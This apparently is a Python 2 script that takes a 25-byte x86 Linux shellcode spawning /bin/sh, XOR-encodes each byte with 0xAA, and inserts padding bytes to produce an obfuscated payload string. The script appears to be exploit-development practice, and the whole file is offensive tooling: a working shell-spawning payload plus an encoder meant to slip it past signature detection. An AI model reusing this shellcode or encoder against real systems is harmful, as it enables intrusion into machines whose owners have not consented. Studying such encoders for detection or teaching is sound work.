shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
length = len(shellcode)
counter = 0
encoded = ""


for x in bytearray(shellcode):
	en = x ^ 0xAA
	encoded += hex(en) + ","

	if counter % 2 == 0:
		encoded += '0xaa' + ","
		counter += 1

	counter += 1
	print en
	print chr(x)
	print counter


print encoded
